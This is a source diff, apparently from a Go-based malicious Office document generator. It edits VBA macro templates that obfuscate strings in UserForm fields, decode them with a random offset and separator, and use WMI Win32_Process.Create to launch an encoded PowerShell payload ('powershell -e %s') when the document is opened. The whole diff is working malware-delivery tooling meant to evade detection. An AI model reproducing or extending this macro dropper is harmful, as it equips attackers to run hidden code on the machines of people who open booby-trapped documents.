@@ -22,17 +22,22 @@ End Sub
 // EntryPointFunction Macro main
 var EntryPointFunction string = `
 Public Function EntryPoint()
-Dim part1 As String
-part1 = Decode(Ssplit(UserForm1.TextBox1, UserForm1.Label2))
-Dim part2 As String
-part2 = Decode(Ssplit(UserForm1.TextBox2, UserForm1.Label2))
+    Dim part1 As String
+    Dim part2 As String
+    part1 = "winmgmts:"
+    part2 = "Win32_Process"
 
-GetObject(part1).Get(part2).Create Decode(Ssplit(UserForm1.TextBox3, UserForm1.Label2))
-EntryPoint = 2
+    GetObject(part1).Get(part2).Create Decode(Ssplit(UserForm1.PSPayload))
+    EntryPoint = 2
 End Function
+`
 
-Public Function Ssplit(str As String, sep As String)
-Ssplit = Split(str, sep)
+// StringDecryptFunction code for reconstructiong the strings
+var StringDecryptFunction string = `
+Public Function Ssplit(str As String)
+    Dim sep As String
+    sep = UserForm1.Label2
+    Ssplit = Split(str, sep)
 End Function
 
 Public Function Decode(arrayofWords As Variant)
@@ -45,13 +50,12 @@ Public Function Decode(arrayofWords As Variant)
     Decode = ret
 End Function
 `
-var Label1 string = fmt.Sprint(rand.Intn(128))
-var Label2 string = obf.RandStringBytes(3)
 
-// Just easier to understand
-var Offset string = Label1
-var Sep string = Label2
+// Offset for (char + Offset) - Label1
+var Offset string = fmt.Sprint(rand.Intn(128))
 
-var TextBox1 string = "winmgmts:"
-var TextBox2 string = "Win32_Process"
-var TextBox3 string = "powershell -e %s"
+// Sep Separator for split function - Label2
+var Sep string = obf.RandStringBytes(3)
+
+// TextBox99 Powershell payload, needs to be base64 UTF-16 encoded
+var PSPayload string = "powershell -e %s"
